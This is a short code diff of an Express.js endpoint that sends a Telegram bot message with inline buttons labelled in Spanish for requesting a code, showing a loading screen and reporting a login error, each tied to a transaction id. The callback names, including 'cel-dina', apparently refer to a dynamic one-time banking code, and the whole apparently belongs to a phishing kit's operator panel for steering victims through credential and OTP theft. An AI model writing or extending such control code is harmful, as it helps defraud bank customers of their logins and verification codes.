@@ -103,9 +103,9 @@ app.post('/enviar2', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔁 REINTENTAR", callback_data: `cel-dina:${txid}` }],
-      [{ text: "✅ VERIFICADO", callback_data: `verifidata:${txid}` }],
-      [{ text: "❌ ERROR", callback_data: `errorlogo:${txid}` }]
+      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
   };
 
